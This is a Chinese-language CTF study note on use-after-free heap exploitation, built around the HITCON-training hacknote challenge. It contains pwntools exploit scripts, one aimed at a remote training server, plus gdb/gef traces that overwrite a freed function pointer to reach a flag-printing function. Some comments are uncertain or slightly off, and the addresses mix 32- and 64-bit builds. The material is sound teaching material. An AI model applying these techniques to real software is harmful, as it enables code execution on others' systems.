# Use After Free

## 原理

Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

- **释放后置为 `NULL`**：内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- **释放后未修改内存**：内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- **释放后修改内存**：内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。**

这里给出一个简单的例子

```c++
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");  //等价于myprint("this is my function")，输出：`this is my function`。
  
  // free without modify
  free(a);
  a->func("I can also use it");  // 此时a内存块已被释放，但由于a指针没有被置为 `NULL`，仍然指向之前的地址。如果这块内存未被修改，程序可能正常运行。这里输出：`I can also use it`。
  
  // free with modify
  a->func = printmyname;  //虽然内存已被释放，但依然可以修改其内容。`a->func` 被赋值为 `printmyname`。
  a->func("this is my function"); //这里的参数不会被使用
  
  // set NULL
  a = NULL;  
  printf("this pogram will crash...\n");
  a->func("can not be printed..."); 
}
```

运行结果如下

```shell
➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
```

## 攻击手段
一些常见的攻击手段利用"use-after-free"漏洞包括：
1. **代码执行**：攻击者可能利用已释放但未清除引用的对象，来执行恶意代码。这可能导致攻击者获取系统权限或者窃取敏感数据。
2. **内存损坏**：恶意软件可以利用"use-after-free"漏洞来修改已释放的内存，导致系统崩溃或不稳定。
3. **信息泄漏**：攻击者可能通过利用这类漏洞来访问敏感信息，如用户个人数据或者加密密钥等。

## 例子

以 HITCON-training 中的 [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) 为例。

下载步骤：

```
mkdir ctf-challenges
```

```
cd ctf-challenges
```

把远程仓库的url(remoteURL)加入到config文件中去，在config中设置sparse checkout模式为true：
```
git init
```

```
git remote add -f origin git@github.com:ctf-wiki/ctf-challenges.git
```

```
git config core.sparseCheckout true
```

把需要checkout（即需要下载的）文件或目录写入.git/info/sparse-checkout
```
echo "pwn/heap/use_after_free/hitcon-training-hacknote" >> .git/info/sparse-checkout
```

然后下载
```
 git pull origin master
```


### 功能分析

我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有

```c
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
```

故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。

其对应的main函数如下：
``` C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

.....

void magic() { system("cat flag"); }

void menu() {
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  printf("Your choice :");
};

int main() {
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  char buf[4];
  while (1) {
    menu();
    read(0, buf, 4);
    switch (atoi(buf)) {
    case 1:
      add_note();
      break;
    case 2:
      del_note();
      break;
    case 3:
      print_note();
      break;
    case 4:
      exit(0);
      break;
    default:
      puts("Invalid choice");
      break;
    }
  }
  return 0;
}
```


#### add_note

根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段: `void (*printnote)();` 与`char *content;`，其中`printnote`会被设置为一个函数，其函数功能为输出 `content` 具体的内容。

note的结构体定义如下:
```c
struct note {
  void (*printnote)();  // 一个函数指针，指向一个没有返回值 (`void`) 且没有参数的函数。它可以存储指向任何符合该签名的函数的地址，允许动态调用不同的打印函数。
  char *content;
};

struct note *notelist[5];
int count = 0;
```
add_note 函数代码如下:
```c++
void add_note() {
  int i;  //计数器
  char buf[8];
  int size;
  // 最大添加note数目是3
  if (count > 5) {
    puts("Full");
    return;
  }
  for (i = 0; i < 5; i++) {
    if (!notelist[i]) {
      //寻找到空闲，则添加一个note节点
      notelist[i] = (struct note *)malloc(sizeof(struct note));
      if (!notelist[i]) {
        puts("Alloca Error");
        exit(-1);
      }
      // 将结构体中的函数指针 `printnote` 初始化为 `print_note_content` 函数。
      notelist[i]->printnote = print_note_content;
      printf("Note size :");  //提示用户输入content大小
      read(0, buf, 8);  //读取最多8个字符
      size = atoi(buf);
      notelist[i]->content = (char *)malloc(size);
      if (!notelist[i]->content) {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");  //提示用户进行输入，输入content内容
      read(0, notelist[i]->content, size);
      puts("Success !");
      count++;
      break;
    }
  }
}
```
#### print_note

print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。

``` C
void print_note_content(struct note *this) { puts(this->content); }
```

```c++
void print_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);  //读取用户输入的要打印的note index
  idx = atoi(buf); //转为整数
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  if (notelist[idx]) {
    notelist[idx]->printnote(notelist[idx]);
  }
}
```

#### delete_note

delete_note 会根据给定的索引来释放对应的note。**但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。** 

```c++
void del_note() {
  char buf[4];
  int idx;
  printf("Index :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx < 0 || idx >= count) {
    puts("Out of bound!");
    _exit(0);
  }
  //显然，这里没有进行设置为NULL
  if (notelist[idx]) {
    free(notelist[idx]->content);
    free(notelist[idx]);
    puts("Success");
  }
}
```

#### magic
``` C++
void magic(){
	system("cat flag"); // 输出flag文件的内容
}
```

### 利用分析

我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free 来使得这个程序执行magic函数呢？**一个很直接的想法是修改note的`printnote`字段为magic函数的地址，从而实现在执行`printnote` 的时候执行magic函数。** 那么该怎么执行呢？                                                                         

我们可以简单来看一下每一个note生成的具体流程

1. 程序各申请8字节内存用来存放note中的printnote、content指针。
2. 程序根据输入的size来申请指定大小的内存，然后用来存储content。

           +-----------------+                       
           |   printnote     |                       
           +-----------------+                       
           |   content       |       size              
           +-----------------+------------------->+----------------+
                                                  |     real       |
                                                  |    content     |
                                                  |                |
                                                  +----------------+

那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。**我们的目的是希望一个note的put(printnote)字段为magic的函数地址，那么我们必须想办法让某个note的printnote指针被覆盖为magic地址。由于程序中只有唯一的地方对printnote进行赋值。所以我们必须利用写real content的时候来进行覆盖。** 具体采用的思路如下

- 申请note0，note大小为16，real content size为32
- 申请note1，real content size为32
- 释放note0，但未设置为NULL
- 释放note1，但未设置为NULL
* **此时，大小为 16 字节的 fastbin chunk 中链表为 `note1 -> note0`**
	 - **Fastbin 链表**：堆分配器（如 `glibc`）将释放的内存块（chunk）加入到对应大小的 **fastbin 链表** 中。
	 - 由于 `note0` 和 `note1` 都是 16 字节大小，它们的内存块会被放入到 **16 字节 fastbin** 中。
	 - 经过两次 `free` 操作后，fastbin 链表中会包含两个已释放的块，并且链表顺序为 `note1 -> note0`（LIFO 后进先出顺序，后释放的块排在前面）。
- 申请note2，并且设置real content的大小为8，那么根据堆的分配规则
	- **note2其实会分配note1对应的内存块。**
	- **real content 对应的chunk其实是note0。**
	- 详细解释：这时程序再次调用 `malloc` 申请内存，分配给 `note2`，申请的大小为 16 字节，但 **用户指定的 `real content size` 是 8 字节**。根据**堆分配规则**，`malloc` 会尽量从 `fastbin` 中获取匹配的内存块。由于 `note1` 和 `note0` 都是 16 字节，因此它们的内存块会被优先分配。 **`note2` 会分配到 `note1` 对应的内存块**，并且 `real content` 部分的 8 字节会被分配到原本属于 `note0` 内存块的前半部分。
- **如果我们这时候向note2 real content的chunk部分写入magic的地址，那么由于我们没有note0为NULL。当我们再次尝试输出note0的时候，程序就会调用magic函数。**

### 利用脚本

#### 准备过程

1. 安装pwn库 [python安装pwn库 - CSDN文库](https://wenku.csdn.net/answer/4k4nrpw3x4)
``` shell 
apt-get install python3-pip python3-dev
```

``` shell
apt install python3-pwntools
```

2. 安装gdb
检查系统类型：
``` shell
cat /etc/os-release
```
NAME字段显示系统类型

如果是ubuntu或者debian系统，则执行下面的安装指令
``` shell
sudo apt update
sudo apt install gdb -y
gdb --version
```

#### 编译hacknote.c文件注意事项
为了使调试的二进制文件 `./hacknote` **有符号表**（通常是调试信息），需要在该文件被编译时启用调试选项（例如，未使用 `-g` 编译选项）：
```shell
gcc -g -o hacknote hacknote.c
```

否则运行下面指令会遇到如下报错：
```shell
gdb ./hacknote 
b *ox1242
```

```shell
No symbol table is loaded. Use the "file" command.
```

#### 查询magic等函数符号及其地址
``` shell
disassemble magic
```

得到的输出如下：

![[Pasted image 20241222170413.png]]

#### 代码

``` python

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./hacknote')


def addnote(size, content):
    # 它等待接收到 `:` 字符后，发送数字 `1`，表示选择添加笔记
    r.recvuntil(":")
    r.sendline("1") 
    r.recvuntil(":")
    r.sendline(str(size)) # 输入content size
    r.recvuntil(":")
    r.sendline(content) # 输入content内容


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

# `gdb.attach(r)` 将远程连接 `r` 附加到 GDB 调试器（GNU Debugger）。这允许攻击者在程序执行时暂停并查看程序的内部状态，比如寄存器、堆栈、内存等信息。
gdb.attach(r)
# magic = 0x08048986   # magic地址需要修改的，按照前面查询得到的进行修改!!!
magic = 0x0000555555555574

addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1

delnote(0) # delete note 0
delnote(1) # delete note 1

addnote(8, p64(magic)) # add note 2 ，修改成64位的

printnote(0) # print note 0

r.interactive()

```



```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# `Pwntools`用来帮助开发者进行二进制漏洞利用。`pwn` 库提供了丰富的功能，包括与远程程序交互、生成特定的二进制数据等。
# `pwnpwnpwn` 通常用于快速构建常见的 PWN（攻击）操作。
from pwnpwnpwn import *
from pwn import *

# 这个主机和端口是题目给定的远程服务，攻击者通过与该服务的交互来进行攻击
host = "training.pwnable.tw"
port = 11010

r = remote(host,port)

def addnote(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

magic = 0x08048986
system = 0x8048506

addnote(32,"ddaa")  # add note 0
addnote(32,"ddaa")  # add note 1
addnote(32,"ddaa")  # 不确定这一句是否正确

delnote(0) # delete note 0
delnote(1) # delete note 1

# `p32(magic)` 是将 `magic` 地址（0x08048986）转换成 4 字节的小端格式（即 `p32(magic)` 会将 `magic` 转化为 `\x86\x89\x04\x08`）。
addnote(8,p32(magic)) # add note 2

printnote(0) # print note 0

r.interactive()
```


#### 执行流程 [[调试的相关指令]]

我们可以具体看一下执行的流程


1. **启动程序并进入主函数**：
    
    ```bash
    gdb ./hacknote
	(gdb) start
    ```
    这会运行程序到 `main` 函数，并加载程序的代码和数据段。


2. 查询malloc的目标地址：
```shell
(gdb) disassemble add_note
```

得到的输出如下,`c`即可展示全部内容：
```shell
--Type <RET> for more, q to quit, c to continue without paging--
```
得到的地址如下：

![[Pasted image 20241222214005.png]]


![[Pasted image 20241222171501.png]]


3. **两处malloc下断点
![[Pasted image 20241222171602.png]]

  **4. 两处free下断点**
![[Pasted image 20241222203359.png]]


![[Pasted image 20241222203541.png]]


然后继续执行程序
```shell
run
```


当程序运行到断点时，`gdb` 会暂停程序执行。这时可以通过以下步骤逐一查看寄存器信息。
    
```bash
    (gdb) info registers     //列出所有寄存器内容
    (gdb) print $rax      //查看特定的寄存器
``` 

单步调试并查看寄存器，使用 `finish` 命令继续运行到 `malloc` 返回：

```shell
    (gdb) finish
```


```
    (gdb) next  # 执行一条指令
    (gdb) info registers
```

![[Pasted image 20241222194136.png]]



可以看出申请note0时，所申请到的内存块地址为0x555...92a0。

```shell
continue
```

下图看出，申请note 0的content的地址为0x555...92c0

![[Pasted image 20241222201252.png]]

```
p notelist
```

类似的，我们可以得到note1的地址以及其content的地址分别为0x555...92f0 和0x555...9310。


同时，我们还可以看到note0与note1对应的content确实是相应的内存块。
```asm
gef➤  grep aaaa
gef➤  grep ddaa
```





---






下面就是free的过程了。我们可以依次发现首先，note0的content被free

```asm
 →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b018  →  "aaaa"	 ← $esp

```

然后是note0本身

```asm
 →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp	 ← $esp
```


当delete结束后，我们观看一下bins，可以发现，确实其被存放在对应的fast bin中，

```c++
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

当我们将note1也全部删除完毕后，再次观看bins。可以看出，后删除的chunk块确实处于表头。

```asm
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

那么，此时即将要申请note2，我们可以看下note2都申请到了什么内存块，如下

**申请note2对应的内存块为0x804b040，其实就是note1对应的内存地址。**

```asm
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
0x080486cf in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b040  →  0x0804b000  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10

```

**申请note2的content的内存地址为0x804b008，就是note0对应的地址，即此时我们向note2的content写内容，就会将note0的put字段覆盖。**

```asm
gef➤  n 1
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
0x08048761 in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
```

我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的`printnote`指针已经被置为NULL了，这是由fastbin的free机制决定的。

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x00000000	0x0804b018
```

覆盖后，具体的值如下

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x08048986	0x0804b00a
gef➤  x/i 0x08048986
   0x8048986 <magic>:	push   ebp
```

可以看出，确实已经被覆盖为我们所想要的magic函数了。

最后执行的效果如下

```shell
[+] Starting local process './hacknote': pid 35030
[*] Switching to interactive mode
flag{use_after_free}----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
```

同时，我们还可以借助gef的heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下

```asm
gef➤  heap-analysis-helper 
[*] This feature is under development, expect bugs and unstability...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latency)
[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution. 
gef➤  c
Continuing.
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(32)=0x804b018
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(32)=0x804b050
[+] Heap-Analysis - free(0x804b018)
[+] Heap-Analysis - watching 0x804b018
[+] Heap-Analysis - free(0x804b008)
[+] Heap-Analysis - watching 0x804b008
[+] Heap-Analysis - free(0x804b050)
[+] Heap-Analysis - watching 0x804b050
[+] Heap-Analysis - free(0x804b040)
[+] Heap-Analysis - watching 0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - Cleaning up
[+] Heap-Analysis - Re-enabling hardware watchpoints
[New process 36248]
process 36248 is executing new program: /bin/dash
[New process 36249]
process 36249 is executing new program: /bin/cat
[Inferior 3 (process 36249) exited normally]
```

这里第一个输出了两次，应该是gef工具的问题。

## 题目

- 2016 HCTF fheap

